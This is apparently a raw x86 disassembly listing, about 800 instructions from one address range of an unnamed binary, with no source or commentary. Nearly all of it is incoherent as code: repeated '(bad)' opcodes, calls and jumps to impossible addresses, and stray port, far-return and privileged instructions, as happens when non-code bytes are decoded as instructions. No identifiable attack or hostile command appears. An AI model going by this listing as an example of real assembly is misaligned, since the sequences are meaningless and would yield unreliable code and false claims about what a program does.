  427407:	test   ebx,eax
  427409:	jmp    FWORD PTR [eax-0x1]
  42740c:	int    0xed
  42740e:	sub    esp,eax
  427410:	add    eax,DWORD PTR [ebp-0x30]
  427413:	fild   WORD PTR [ebp+0x3f]
  427416:	cmp    eax,edi
  427418:	je     0xca43543a
  42741e:	mov    DWORD PTR [ebp-0x28],0xe300f3
  427425:	(bad)  
  427426:	jne    0x4273b4
  427428:	mov    ebx,ebp
  42742a:	cld    
  42742b:	js     0x427472
  42742d:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  427433:	inc    ebp
  427434:	call   0xea9dc4
  427439:	add    BYTE PTR [ebx-0x7f170301],cl
  42743f:	add    DWORD PTR es:[eax],eax
  427442:	add    al,al
  427444:	xor    BYTE PTR [eax+0x41],dl
  427447:	inc    ebp
  427448:	add    BYTE PTR [ebx+0xfcd88b],cl
  42744e:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  427454:	add    DWORD PTR [ecx+0x458be845],ecx
  42745a:	fmul   DWORD PTR [ebx+0x8bb800]
  427460:	cld    
  427461:	call   0xd79f26
  427466:	dec    DWORD PTR [ebx+0x1090e8ff]
  42746c:	add    al,al
  42746e:	push   eax
  42746f:	es inc ebp
  427471:	inc    ebp
  427472:	mov    ecx,DWORD PTR [ebx+0xd89c]
  427478:	dec    DWORD PTR [ebx-0x3ff70301]
  42747e:	mov    DWORD PTR gs:[eax],eax
  427481:	call   0x8b6aba46
  427486:	inc    ebp
  427487:	mov    eax,0xe8d8008b
  42748c:	add    BYTE PTR [ecx],ch
  42748e:	mov    eax,DWORD PTR [eax]
  427490:	cld    
  427491:	mov    eax,eax
  427493:	call   0x462a84ed
  427498:	sub    DWORD PTR [ebx-0x3c743000],ecx
  42749e:	cld    
  42749f:	mov    BYTE PTR [eax+0x8401c1],0x1
  4274a6:	xor    BYTE PTR [eax],al
  4274a8:	push   edi
  4274a9:	inc    ebp
  4274aa:	mov    DWORD PTR [ebx],esi
  4274ac:	in     al,0xb9
  4274ae:	inc    ebp
  4274af:	lea    ecx,[ebx-0x3c370301]
  4274b5:	dec    ebp
  4274b6:	cwde   
  4274b7:	mov    esi,DWORD PTR [edx]
  4274b9:	or     BYTE PTR [ebx],al
  4274bb:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4274c2:	call   0x429e0c
  4274c7:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4274cd:	jge    0x427502
  4274cf:	mov    eax,DWORD PTR [ebx]
  4274d1:	cld    
  4274d2:	lea    edx,[eax+0xff0120]
  4274d8:	call   0x429e6c
  4274dd:	push   eax
  4274de:	inc    DWORD PTR [ebp-0x1c]
  4274e1:	mov    ecx,DWORD PTR [ebp-0x58]
  4274e4:	xor    eax,DWORD PTR [eax]
  4274e6:	add    edi,edi
  4274e8:	cmp    ebp,eax
  4274ea:	jne    0x427512
  4274ec:	mov    DWORD PTR [eax],0x8b004dd8
  4274f2:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4274f9:	mov    eax,ebx
  4274fb:	cld    
  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
